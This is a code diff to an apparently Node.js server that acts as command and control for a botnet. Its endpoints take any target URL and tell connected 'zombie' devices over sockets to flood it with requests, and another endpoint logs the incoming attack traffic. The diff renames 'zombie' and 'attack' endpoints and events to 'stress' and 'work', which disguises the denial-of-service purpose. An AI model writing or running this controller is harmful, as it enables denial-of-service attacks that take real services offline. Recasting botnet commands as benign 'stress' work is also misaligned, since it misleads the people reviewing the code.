@@ -144,7 +144,8 @@ function getUniqueTargetSockets(devicesCount) {
     return targets;
 }
 
-app.post("/zombie-start", (req, res) => {
+app.post("/start-stress", (req, res) => {
+    console.log(`${RESET} [ ${RED}Stress${RESET} ] Attack started`);
     let { url, devices, method } = req.body;
     
     if (!url) return res.status(400).json({ error: "URL required" });
@@ -155,22 +156,19 @@ app.post("/zombie-start", (req, res) => {
 
     targetIds.forEach(socketId => {
         const socket = io.sockets.sockets.get(socketId);
-        if (!socket) return;
-
-        socket.emit("start_attack", {
+        if (!socket)
+            return;
+        socket.emit("start_work", {
             url: url,
             method: method || "GET"
         });
     });
-
-    console.log(`${YELLOW}[ZOMBIE]${RESET} Activated on ${targetIds.length} devices.`);
-    
     res.status(200).end();
 });
 
-app.post("/zombie-stop", (req, res) => {
-    io.emit("stop_attack", {});
-    console.log(`${GREEN}[ZOMBIE]${RESET} Stop command broadcasted.`);
+app.post("/stop-stress", (req, res) => {
+    io.emit("stop_work", {});
+    console.log(`${RESET} [ ${RED}Stress${RESET} ] Attack stopped`);
     res.status(200).end();
 });
 
@@ -187,8 +185,13 @@ app.all("/target-stress", (req, res) => {
         attackerIp = attackerIp.replace('::ffff:', '');
     }
 
-    if (stressCounter % 10 === 0)
-        console.log(`${RED}[TARGET]${RESET} Attack from IP: ${YELLOW}${attackerIp}${RESET} | Hits: ${stressCounter}`);
+    const now = new Date();
+    const h = now.getHours().toString().padStart(2, '0');
+    const m = now.getMinutes().toString().padStart(2, '0');
+    const s = now.getSeconds().toString().padStart(2, '0');
+    const time = `${h}:${m}:${s}`;
+
+    console.log(`${RESET} [ ${RED}Attack${RESET} ] IP: ${CYAN}${attackerIp}${RESET} | ${time} | Hits: ${stressCounter}`);
     
     res.status(200).end();
 });
